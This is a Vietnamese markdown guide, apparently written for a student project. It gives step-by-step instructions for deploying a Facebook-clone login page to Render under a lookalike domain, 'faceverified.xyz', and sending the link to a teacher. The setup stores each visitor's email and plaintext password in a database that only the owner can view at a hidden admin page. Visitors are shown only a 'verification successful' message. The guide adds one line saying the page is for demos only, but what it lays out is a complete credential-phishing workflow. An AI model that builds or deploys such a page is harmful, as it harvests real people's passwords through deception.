# Deploy với tên miền riêng (vd: https://faceverified.xyz)

## Cách hoạt động (đúng ý đồ án của bạn)

```
Giáo viên mở https://faceverified.xyz
        ↓
Nhập email/SĐT + mật khẩu → bấm Đăng nhập
        ↓
Trình duyệt GỬI dữ liệu lên SERVER của bạn (trên internet)
        ↓
Server LƯU vào database (file logins.db)
        ↓
Hiện trang "Xác minh thành công"
```

Bạn xem dữ liệu tại: **https://faceverified.xyz/admin.html** (chỉ bạn biết link này)

---

## Cần 2 thứ

| Thứ | Ví dụ | Việc phải làm |
|-----|--------|----------------|
| **Tên miền** | `faceverified.xyz` | Mua (~150–300k/năm) tại Namecheap, Porkbun, GoDaddy… |
| **Server (hosting)** | Render.com (miễn phí) | Chạy code Node.js + lưu DB 24/7 trên internet |

Tên miền **không tự chạy web** — nó chỉ trỏ người dùng tới server của bạn.

---

## Các bước thực hiện

### Bước 1 – Đưa code lên GitHub

```powershell
cd D:\new
git init
git add .
git commit -m "Do an facebook clone"
git branch -M main
```

Tạo repo trên https://github.com → rồi:

```powershell
git remote add origin https://github.com/TEN-BAN/facebook-clone-doa.git
git push -u origin main
```

### Bước 2 – Deploy server lên Render (miễn phí)

1. https://render.com → đăng nhập bằng GitHub  
2. **New +** → **Web Service** → chọn repo  
3. **Build Command:** `npm install`  
4. **Start Command:** `npm start`  
5. **Plan:** Free → **Create**  
6. Đợi deploy xong → có link tạm: `https://facebook-clone-doa.onrender.com`  
7. Thử mở link tạm → đăng nhập thử → vào `/admin.html` xem có lưu không

### Bước 3 – Gắn tên miền faceverified.xyz

**Trên Render:**

1. Vào Web Service → **Settings** → **Custom Domains**  
2. **Add Custom Domain** → gõ: `faceverified.xyz`  
3. (Tuỳ chọn) thêm `www.faceverified.xyz`  
4. Render hiện bản ghi DNS cần thêm (thường là **CNAME**)

**Trên nơi mua domain** (Namecheap, Porkbun…):

1. Vào **DNS Management**  
2. Thêm bản ghi:

| Loại | Tên (Host) | Giá trị (Target) |
|------|------------|------------------|
| CNAME | `@` hoặc để trống | `ten-app.onrender.com` (Render ghi sẵn cho bạn) |
| CNAME | `www` | `ten-app.onrender.com` |

> Một số nhà bán domain dùng **ALIAS/ANAME** cho `@` thay vì CNAME — làm đúng theo hướng dẫn Render hiện trên màn hình.

3. Đợi **10 phút – 48 giờ** (thường vài giờ)  
4. Render tự cấp **HTTPS** (ổ khóa xanh)  
5. Mở **https://faceverified.xyz** → xong

### Bước 4 – Gửi giáo viên

Chỉ cần gửi: **https://faceverified.xyz**

Giáo viên không cần cài gì, không cần server local của bạn bật.

---

## Bạn kiểm tra dữ liệu

- Trang admin: **https://faceverified.xyz/admin.html**  
- Mỗi lần ai đó đăng nhập → thêm 1 dòng (email, mật khẩu, thời gian)

---

## Lưu ý quan trọng

1. **Máy bạn tắt vẫn được** — server chạy trên Render, không phải máy nhà.  
2. Gói **free** Render: lần đầu mở link có thể **chờ 30–60 giây**; DB có thể mất nếu server nằm im vài ngày (nên demo trực tiếp hoặc chụp màn admin).  
3. Chỉ dùng cho **đồ án / demo** — không lừa đăng nhập Facebook thật.  
4. Trang success **không có** nút xem dữ liệu (đã bỏ) — giáo viên chỉ thấy “Xác minh thành công”.

---

## Tóm tắt 1 câu

**Mua domain → deploy code lên Render → trỏ DNS domain về Render → gửi https://faceverified.xyz cho giáo viên → dữ liệu đăng nhập về server và lưu DB.**
